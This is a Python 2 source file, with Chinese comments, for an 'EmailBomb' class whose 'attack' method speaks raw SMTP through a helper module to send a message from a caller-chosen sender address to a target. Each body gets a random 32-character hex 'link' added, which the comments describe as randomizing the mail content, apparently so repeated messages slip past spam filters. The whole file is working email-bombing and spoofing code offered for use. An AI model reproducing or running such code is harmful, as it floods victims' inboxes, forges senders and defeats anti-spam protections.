# -*- coding: utf-8 -*-
import Email
import random
import string


class EmailBomb:
    def __init__(self, to_addr, from_addr, SMTP_addr="", port=25, timeout=10):
        self.to_addr = to_addr
        self.from_addr = from_addr
        self.port = port
        self.timeout = timeout
        self.SMTP_addrs = [SMTP_addr] if SMTP_addr else []  # 必须为列表
        self.create()

    def create(self):
        self.emailer = Email.Email(
            to_addr=self.to_addr,
            from_addr=self.from_addr,
            SMTP_addrs=self.SMTP_addrs,
            port=self.port,
            timeout=self.timeout,
        )

    def attack(self, subject, content):
        '''
        攻击启动
        '''

        # 建立连接
        while 1:
            code, msg = self.emailer.Connect()
            if code:
                # 建立会话
                print "send ehlo"
                code, msg = self.emailer.Send(u"ehlo antispam")
                if code:
                    break

        print "send mail from"
        while 1:
            # 表明发件地址
            code, msg = self.emailer.Send(u"mail from:<%s>" % self.from_addr)
            if not code:
                continue

            print "send rcpt to"
            # 表明收件地址
            code, msg = self.emailer.Send(u"rcpt to:<%s>" % self.to_addr)
            if code:
                break

        print "send data"
        while 1:
            # 信件具体内容
            code, msg = self.emailer.Send(u"data")
            if code:
                break

        print "send to"
        while 1:
            # to:
            code, msg = self.emailer.Send(u"to: %s" % self.to_addr, recv=False)
            if not code:
                continue

            # from:
            print "send from"
            code, msg = self.emailer.Send(u"from: %s" % self.from_addr, recv=False)
            if not code:
                continue

            # subject:
            print "send subject"
            code, msg = self.emailer.Send("subject: "+subject, recv=False)
            if not code:
                continue

            # body:
            print "send body"
            code, msg = self.emailer.Send(
                content+u"\r\n\r\n你的专属链接为："+"".join(
                    random.choice(string.hexdigits)
                    for i in range(32)
                )+"\r\n.\r\n",  # 随机化部分邮件内容

                check="250"  # 状态码为 250 说明发送成功
            )

            if code:
                break

        return (code, msg)
